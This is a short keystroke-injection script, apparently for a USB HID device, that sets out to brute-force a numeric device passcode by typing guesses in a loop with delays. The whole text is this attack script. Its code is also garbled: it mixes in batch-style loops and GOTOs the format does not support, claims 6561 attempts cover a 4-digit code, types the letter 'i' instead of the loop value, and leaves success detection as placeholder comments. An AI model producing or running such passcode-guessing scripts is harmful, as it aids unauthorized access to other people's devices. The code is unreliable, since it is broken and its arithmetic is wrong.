DELAY 1000  # Delay 1 second for system stability
REM Replace this with code to obtain the passcode from the authorized source
REM This could be reading it from a file, obtaining it from a database, etc.
REM Example passcode for demonstration purposes
STRING 1234  
ENTER
DELAY 1000  # Delay 1 second before starting brute force attack

REM Function to simulate brute force attack
LABEL brute_force
FOR i FROM 0 TO 6561  # Assume 4-digit numeric passcode, up to 6561 attempts
  STRING i
  ENTER
  DELAY 100  # Delay 0.1 seconds between attempts
  REM Replace the following line with the correct command to detect a successful passcode
  REM For example, if the system displays a specific message or prompt when the passcode is correct,
  REM you can use the STRING and ENTER commands to input the passcode and then use the REM command
  REM to detect the success message or prompt, and exit the loop accordingly.
  REM Example: 
  REM STRING passcode_correct_message
  REM ENTER
  REM IF ERRORLEVEL 1 GOTO success
  REM GOTO continue
  REM :success
  REM PRINT "Passcode successfully retrieved: ", i
  REM GOTO end
  REM :continue
  REM CONTINUE
NEXT i

REM If no successful passcode is found, print an error message
PRINT "Unable to retrieve passcode."
GOTO end

REM End of script
LABEL end
